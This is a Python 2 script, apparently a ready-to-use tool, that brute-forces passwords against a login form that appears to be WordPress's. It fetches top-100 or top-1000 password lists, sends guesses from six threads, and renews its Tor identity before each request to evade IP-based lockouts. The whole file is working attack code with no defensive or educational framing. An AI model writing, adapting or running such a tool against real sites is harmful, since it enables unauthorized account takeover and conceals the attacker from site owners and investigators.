from colorama import Fore, Back, Style
import Queue
import threading
from splinter import Browser
import selenium
from TorCtl import TorCtl
import urllib, urllib2

exitFlag = 0

class myThread (threading.Thread):
	def __init__(self, threadID, name, q):
		threading.Thread.__init__(self)
		self.threadID = threadID
		self.name = name
		self.q = q
	def run(self):
		print("Starting " + self.name)
		process_data(self.name, self.q)
		print("Exiting " + self.name)

def renew_connection():
	conn = TorCtl.connect(controlAddr="127.0.0.1", controlPort=9051, passphrase="tobaggan")
	conn.send_signal("NEWNYM")
	conn.close()

def set_url_proxy():
	proxy_support = urllib2.ProxyHandler({"http" : "127.0.0.1:8118"})
	opener = urllib2.build_opener(proxy_support)
	urllib2.install_opener(opener)

def process_data(threadName, q):
	global exitFlag
	while not exitFlag:
		queueLock.acquire()
		if not workQueue.empty():
			password = q.get()
			queueLock.release()
			set_url_proxy()
			renew_connection()
			payload = urllib.urlencode({"log" : username, "pwd" : password})
			req = urllib2.Request(url, payload)
			request = urllib2.urlopen(req)
			page = request.read().decode("utf-8")	
			if "ERROR" in page:
				print(Fore.WHITE + Back.RED + Style.BRIGHT  + "Incorrect password: " + password + Style.RESET_ALL)
			else:
				print(Fore.WHITE + Back.GREEN + Style.BRIGHT + "Found password: " + password + Style.RESET_ALL)
				exitFlag = 1
		else:
			queueLock.release()

password_list = []
password_location = str(raw_input("What password list would you like to use?\nFor top 100 list type '1', for top 1000 list type '2'\nFor your own list, type the path to your list.\n"))

if password_location == "1":
	browser = Browser("phantomjs")
	browser.visit("https://github.com/danielmiessler/SecLists/blob/master/Passwords/10_million_password_list_top_100.txt")
	for i in range(1, 101):
		newline = browser.find_by_id("LC" + str(i)).value
		password_list.append(newline)
	browser.quit()
elif password_location == "2":
	browser = Browser("phantomjs")
	browser.visit("https://github.com/danielmiessler/SecLists/blob/master/Passwords/10_million_password_list_top_1000.txt")
	for i in range(1, 1001):
		newline = browser.find_by_id("LC" + str(i)).value
		password_list.append(newline)
	browser.quit()
else:
	password_file = open(password_location)
	for line in password_file.readlines():
		newline = line.rstrip()
		password_list.append(newline)

username = str(raw_input("What username should we target? "))
url = str(raw_input("What url should we target? "))
headers = {'content-type': "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"}

threadList = ["Thread-1", "Thread-2", "Thread-3", "Thread-4", "Thread-5", "Thread-6"]
queueLock = threading.Lock()
workQueue = Queue.Queue(len(password_list))
threads = []
threadID = 1

for tName in threadList:
	thread = myThread(threadID, tName, workQueue)
	thread.start()
	threads.append(thread)
	threadID += 1

queueLock.acquire()
for password in password_list:
	workQueue.put(password)
queueLock.release()

while not workQueue.empty() and not exitFlag:
	pass

exitFlag = 1

for t in threads:
	t.join()
print("Exiting Main Thread")